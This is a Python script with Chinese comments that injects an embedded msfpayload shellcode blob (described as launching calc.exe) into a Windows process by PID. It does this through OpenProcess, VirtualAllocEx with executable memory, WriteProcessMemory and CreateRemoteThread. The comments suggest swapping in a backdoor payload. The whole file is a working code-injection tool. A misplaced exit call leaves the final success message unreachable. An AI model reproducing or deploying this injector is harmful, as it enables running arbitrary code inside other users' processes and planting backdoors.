#!python
# -*- coding:utf-8 -*-
# 导入sys库以及ctypes库
import sys
from ctypes import *

PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM = (0x1000 | 0x2000)

kernel32 = windll.kernel32
pid = int(sys.argv[1])

if not sys.argv[1]:
    print("Code Injector: ./code_injector.py <PID to inject>")
    sys.exit(0)

# shellcode使用msfpayload生成的，我这里是一个计算器，当然你可以直接生成一个后门程# 序。生成代码：msfpayload  windows/exec  CMD = calc.exe  EXITFUNC=thread  C　
shellcode = ("\xbd\x5b\x4d\x9f\x23\xdb\xda\xd9\x74\x24\xf4\x58\x2b"
    "\xc9\xb1\x9d\x31\x68\x12\x03\x68\x12\x83\xb3\xb1\x7d"
    "\xd6\xfc\xfc\xab\xab\x8e\xd8\x49\x12\xfa\xfe\x65\xf8"
    "\x2b\x36\x34\x95\x1a\xb5\x24\x99\x21\x56\xc8\x58\x6b"
    "\x93\x89\x37\xfd\x94\x49\xb1\xa6\xe7\x33\x63\x2b\x4f"
    "\x9f\x19\x29\x51\x84\x90\xe3\x2a\x5d\xdf\x0c\x34\x04"
    "\x13\xe0\xa0\x94\x1c\x18\xa3\xe6\x5f\x33\x85\x9c\xc5"
    "\xcf\xd6\xb8\x3f\xbb\x1b\x99\x6b\x99\xe8\xf9\xb1\x36"
    "\x56\x21\x0c\x45\xc2\x10\x2c\xd8\x3a\xc9\x10\x80\x04"
    "\x0d\x5e\xac\xeb\x46\xb0\xaf\xe1\x1f\xff\x11\xad\x5d"
    "\xe9\x07\x1c\xb5\xc3\x69\x1d\x8a\x65\xee\x05\x65\x4e"
    "\xe0\x85\x07\xe3\x3f\xcf\x7f\xdd\x50\x2b\x6a\x6d\x70"
    "\x0d\xe7\xf6\x9b\x48\x74\x78\x67\xe7\x6a\x05\x37\xe0"
    "\xae\x56\x6c\xa7\x02\x6d\xd3\xba\x56\xf3\xe1\x53\x32"
    "\xf2\x7a\x49\xc2\xef\xd6\x4f\x13\x9d\xc3\x31\x29\x1d"
    "\xc3\x14\xaf\x1d\x9f\x08\xc0\xaa\xf8\x49\x10\xa2\x38"
    "\xf6\xd1\x30\xf0\x5b\x05\xc1\xe5\xda\x35\x92\xd5\xcb"
    "\xa6\x94\x6e\x9b\xd6\x25\xf9\x89\x06\x95\x96\x8e\xcd"
    "\x49\x17\xa2\xae\x8a\xc3\x71\x6e\xed\xb8\x8e\xfe\xb8"
    "\x52\x29\xf6\x59\x7c\xb0\x2c\x44\xe2\xcd\x49\x2b\x02"
    "\x44\x0b\x05\xff\x1f\x5b\xe8\x38\x14\x0f\x63\xc3\x17"
    "\xe7\x0f\x40\x1c\xdb\x6c\x96\x71\x16\xa8\x0d\x94\x88"
    "\xd4\x75\xe4\x9b\xfd\xb1\x2e\x62\x18\x65\x8b\xdb\x74"
    "\xfb\xa8\xca\x8f\xd5\xb1\x43\xeb\xd5\x8c\x11\xc6\x50"
    "\x28\xd6\xe5\x31\xd4\x55\x13\xc7\x77\x64\x71\xd0\xc9"
    "\x5c\xa5\x8b\x56\x39\x3f\x07\x67\xa0\x5c\x98\x20\x72"
    "\x9e\x45\xee\x21\xa3\x80\xb0\x55\x64\x78\x7c\xb4\xb7"
    "\xf9\x60\x2a\xf4\xbf\x0e\xf8\x94\x67\x3b\xa9\x1a\xc5"
    "\x53\x2a\xfd\x3b\x39\x55\x84\x28\x3e\x3a\x43\x5a\x72"
    "\x79\xf2\x43\x15\x54\x6c\x15\x08\xf9\x08\xcb\xc4\x71"
    "\x8f\x0b\x1f\x78\x88\x0d\x93\xfc\x5b\x10\x54\xcc\x9b"
    "\x65\x02\x46\x66\xa8\xf1\x2b\xd4\x3e\xa3\x12\x9c\xd5"
    "\x3d\x57\x95\x47\x9e\x6b\x69\x82\x94\xb1\xcb\x5c\xc4"
    "\xef\x00\xe5\x0b\x1d\x0a\x2e\xb0\x2c\xd6\xb4\xcd\x9a"
    "\x4c\xb1\x52\x93\xa6\xd7\xd2\x25\x15\x0c\xb4\x93\xb0"
    "\x2e\xfe\x17\xe6\xdd\x3d\x6e\xab\x6c\x5b\x9d\x85\xbe"
    "\xb1\x42\x60\xfc\xb0\x89\x66\x5a\xfb\xfe\x67\x7f\x66"
    "\xad\x9a\x5d\x3b\xf1\x92\xa8\x65\x0b\x57\x9c\x03\x0a"
    "\x33\x91\x9f\x7b\x18\xea\x24\x0b\x4e\xdc\x04\x3b\xf6"
    "\x72\xda\xff\x24\xe8\x58\xbd\xf0\x9c\x68\xd5\xac\xa3"
    "\x2d\xc6\xb3\xf2\xda\xf1\xeb\x43\x4a\x56\xba\x08\xd2"
    "\x84\x7a\x32\x0a\xdb\xfa\xb8\x54\x44\x99\xf9\x8c\xbc"
    "\xbb\x8d\xf2\x5f\xd5\x90\x05\xc1\xc6\xc5\xab\xde\xfb"
    "\xdc\xb4\x75\x60\x7d\x06\x5e\x73\x6b\x13\x47\xed\x54"
    "\xb2\xb6\x5a\xde\xf4\xc4\x18\xab\x4e\xa5\xca\x31\xc8"
    "\x48\x0d\x4a\x7b\xfe\xa8\x1e\xed\x59\x88\xef\xf0\xf5"
    "\xb0\xc4\xd1\x8e\x9d\xd1\xf6\xce\x66\x7e\x43\x63\x9f"
    "\x17\x17\x98\xb4\x25\xd6\x98\xdb\x44\x5d\xcd\x50\xf7"
    "\x40\x7d\x8d\x27\x74\x85\x45\xb0\xf2\xe5\x9d\x19\x89"
    "\x21\x23\x69\xd8\x63\x49\x8f\x95\xad\xcf\x98\x01\xd7"
    "\x48")

code_size = len(shellcode)

# 获取我们要注入的进程句柄
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

if not h_process:
    print("[*] Couldn't acquire a handle to PID: %s" % pid)
    sys.exit(0)

# 为我们的shellcode申请内存
arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

# 在内存中写入shellcode
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))

# 创建远程线程，指定入口为我们的shellcode头部
thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
    print("[*] Failed to inject shellcode. Exiting.")
sys.exit(0)

print("[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value)